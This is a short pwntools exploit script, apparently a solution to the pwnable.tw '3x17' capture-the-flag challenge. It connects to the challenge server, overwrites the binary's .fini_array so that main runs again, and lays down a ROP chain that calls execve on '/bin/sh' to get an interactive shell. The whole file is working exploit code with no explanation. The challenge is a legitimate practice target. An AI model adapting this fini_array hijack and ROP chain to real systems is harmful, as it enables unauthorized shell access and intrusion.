from pwn import *

#io = process('./3x17')
io = remote('chall.pwnable.tw', 10105)

fini_array = 0x4b40f0
fini_func = 0x402960
main = 0x0401b6d

def write(addr, value):
    print(io.recvuntil(b'addr:'))
    io.send(str(addr).encode('utf-8'))
    print(io.recvuntil(b'data:'))
    io.send(value)

#pause()

sh = fini_array+8*11

write(fini_array, p64(fini_func)+p64(main))
write(fini_array+8*2, p64(0x401696)+p64(sh))
write(fini_array+8*4, p64(0x406c30)+p64(0))
write(fini_array+8*6, p64(0x446e35)+p64(0))
write(fini_array+8*8, p64(0x41e4af)+p64(0x3b))
write(fini_array+8*10, p64(0x4022b4)+b'/bin/sh\0')
write(fini_array, p64(0x401c4b)+p64(0x40fa73))
io.interactive()